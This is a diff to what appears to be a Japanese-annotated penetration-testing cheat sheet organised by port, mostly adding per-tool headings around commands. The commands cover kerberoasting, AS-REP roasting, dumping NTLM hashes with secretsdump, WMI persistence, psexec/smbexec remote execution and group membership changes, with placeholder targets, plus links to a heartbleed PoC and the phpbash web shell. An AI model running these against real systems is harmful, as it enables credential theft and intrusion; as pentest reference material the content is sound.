@@ -78,7 +78,7 @@ impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DO
 impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -no-pass 'DOMAIN/USERNAME'
 ```
 - impacket-GetUserSPNs
-```
+```sh
 # kerberoasting (TCP389番も必要)
 impacket-GetUserSPNs -outputfile 'FILE' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
 ```
@@ -107,7 +107,6 @@ sudo ntpdate 'IP'
 
 ## 135
 https://github.com/XiaoliChan/wmiexec-Pro
-
 
 
 ## 389
@@ -284,7 +283,6 @@ sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback 
   - [heartbleed](https://github.com/sensepost/heartbleed-poc)
 
 
-
 ## 445 (139を使うことも)
 (msrpcはTCP135番やDynamicPortも使う)
 - donpapi
@@ -305,7 +303,7 @@ enum4linux -a -d -u 'USERNAME' -p 'PASSWORD' -w 'DOMAIN' -v 'IP'
 ```sh
 enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
-- impacket
+- impacket-net
 ```sh
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -name 'USERNAME'
@@ -327,16 +325,33 @@ impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -join 'USERNAME'
 impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -unjoin 'USERNAME'
+```
+- impacket-netview
+```sh
 # track of who logged in or 
 impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
+```
+- impacket-secretsdump
+```sh
 # dumping NTLM hashs and Kerberos Keys
 impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
+```
+- impacket-smbclient
+```
 # smb
 impacket-smbclient 'DOMAIN/USERNAME:PASSWORD@IP'
-# wmi
+```
+- impacket-wmipersist
+```sh
 impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command "COMMAND"
+```
+- impacket-wmiquery
+```sh
 impacket-wmiquery 'DOMAIN/USERNAME:PASSWORD@IP'
+```
+- impacket-psexec
+```sh
 # exec
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
@@ -620,7 +635,7 @@ openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
 ```sh
 ./username-anarchy -i userlist.txt > user.txt
 ```
-- phpbash
+- phpbash  
 [phpbash](https://github.com/Arrexel/phpbash)
 
 
